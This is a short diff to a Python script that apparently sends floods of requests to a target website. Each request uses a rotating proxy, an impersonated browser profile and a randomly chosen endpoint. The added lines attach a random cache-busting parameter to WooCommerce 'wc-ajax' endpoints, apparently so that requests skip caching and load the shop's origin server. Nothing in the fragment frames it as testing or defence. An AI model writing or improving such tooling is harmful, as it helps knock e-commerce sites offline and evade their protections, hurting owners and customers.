@@ -103,6 +103,9 @@ def next_proxy(single_proxy):
 def send_one(target, single_proxy, req_num):
     imp, ua = random.choice(PROFILES)
     path = random.choice(_endpoints)
+    if "wc-ajax=" in path:
+        sep = "&" if "?" in path else "?"
+        path = f"{path}{sep}_={int(time.time() * 1000) + random.randint(0, 999)}"
     url  = f"https://{target}{path}"
     p    = next_proxy(single_proxy)
     px   = {"http": p, "https": p} if p else None
